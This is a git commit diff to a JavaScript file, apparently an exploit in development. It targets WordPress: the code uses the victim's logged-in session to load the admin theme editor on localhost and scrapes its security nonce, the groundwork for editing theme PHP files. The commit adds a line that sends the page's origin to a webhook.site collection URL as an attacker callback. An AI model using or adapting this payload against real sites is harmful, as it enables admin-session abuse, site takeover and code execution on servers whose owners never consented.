9baad7b853a74fcc63e2958ed97e8c86095b8e54
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 11:36:34 +0300

    Update phaedon.js

--- phaedon.js
+++ phaedon.js
@@ -1,5 +1,6 @@
 async function pepe(){
-    var a = await fetch('http://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+location.origin);
+    var a = await fetch('http://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
     console.log(a);//try with a different file 
     return a;
 }
